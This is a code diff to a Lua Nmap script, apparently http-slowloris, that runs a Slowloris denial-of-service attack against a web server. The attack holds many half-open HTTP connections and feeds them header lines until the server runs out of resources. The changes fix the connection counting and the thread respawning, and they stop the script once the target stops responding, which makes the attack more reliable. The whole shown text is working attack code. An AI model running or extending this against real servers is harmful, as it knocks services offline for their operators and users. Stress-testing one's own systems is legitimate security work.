@@ -63,7 +63,7 @@ local function get_end_time()
 	return end_time 
 end
 
-local threads = 0 -- this will save the amount of still connected threads
+local thread_count = 0 -- this will save the amount of still connected threads
 local sockets = 0 -- the maximum amount of sockets during the attack. This could be lower than the requested concurrent connections because of the webserver configuration (eg maxClients on Apache)
 local queries = 0 -- this will save the amount of new lines sent to the half-http requests until the target runs out of ressources
 local server_notice  
@@ -81,13 +81,12 @@ local doHalfhttp = function(host,port,obj)
 	
 	-- create socket
 	local slowloris = nmap.new_socket()
+	thread_count = thread_count + 1 
 	slowloris:set_timeout(200 * 1000) -- set a long timeout so our socked doesn't timeout while it's waiting
 	local catch = function()
-		local count = threads -- retrieve the number of already effective connections
 		-- this connection is now dead
-		count = count - 1
-		stdnse.print_debug("HALF_HTTP: " .. ": lost connection, "..count.." still remain")
-		threads = count
+		thread_count = thread_count - 1
+		stdnse.print_debug("HALF_HTTP: lost connection")
 		slowloris:close()
 		slowloris = nil
 		condvar "signal"
@@ -104,12 +103,9 @@ local doHalfhttp = function(host,port,obj)
 	try(slowloris:send(half_http))
 	server_notice = " (attack against "..host.ip.."): HTTP stream started."
 
-	-- retrieve the number of already effective connections
-	local count = threads
-	count = count + 1
-	threads = count
+
 	-- during the attack some connections will die and other will respawn. Here we keep in mind the maximum concurrent connections reached.
-	if sockets <= threads then sockets = threads end
+	if sockets <= thread_count then sockets = thread_count end
 
 	local feed_interval = stdnse.get_script_args("http-slowloris.timeout")
 	if feed_interval == nil then feed_interval = 100 end
@@ -123,9 +119,10 @@ local doHalfhttp = function(host,port,obj)
 		try(slowloris:send("X-a: b\r\n"))
 		server_notice = " (attack against "..host.ip.."): Feeding HTTP stream..."
 		queries = queries + 1
-		server_notice = server_notice .. "\n(attack against "..host.ip.."): "..queries.." queries sent using "..threads.." connections." 
+		server_notice = server_notice .. "\n(attack against "..host.ip.."): "..queries.." queries sent using "..thread_count.." connections." 
 	end
 	slowloris:close()
+	thread_count = thread_count - 1
 	condvar "signal"
 end
 
@@ -139,9 +136,10 @@ local doMonitor = function(host,port)
 		  .."\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n\r\n"
 	
 	local catch = function()
-		stdnse.print_debug("MONITOR: " .. " (monitor on ".. host.ip .. "): Monitoring has shut down due to lack of response from the webserver." )
+		stdnse.print_debug("MONITOR: " .. " (monitor on ".. host.ip .. "): Monitoring has shut down due to lack of response from the webserver. Server could be down completly." )
 		monitor:close()
 		request_faults = request_faults +1
+		stop_all = true
 	end
 	
 	while not stop_all do
@@ -196,11 +194,12 @@ local worker_schedluer = function(host, port)
 		for thread in pairs(threads) do
 			if coroutine.status(thread) == "dead" then 
 				threads[thread] = nil 
-				stdnse.print_debug("starting new thread")
-				local co = stdnse.new_thread(doHalfhttp, host, port,obj)
-				threads[co] = true
+
 			end
 		end
+		stdnse.print_debug("starting new thread")
+		local co = stdnse.new_thread(doHalfhttp, host, port,obj)
+		threads[co] = true		
 		until next(threads) == nil;
 	end
 end
@@ -227,12 +226,12 @@ action = function(host, port)
 		stdnse.print_debug("RUNNING FOREVER")
 	end
       -- return a live notice from time to time	
-	while nmap.clock_ms() < end_time or not (runforever == nil) do
+	while (nmap.clock_ms() < end_time or not (runforever == nil)) and not stop_all do
 		if server_notice ~= last_message then -- don't flood the output by repeating the same info 
 			stdnse.print_debug("MAIN THREAD: " .. server_notice)
 			last_message = server_notice
 		end
-		if dosed then
+		if dosed and runforever == nil then
 			break
 		end
 		stdnse.sleep(10)
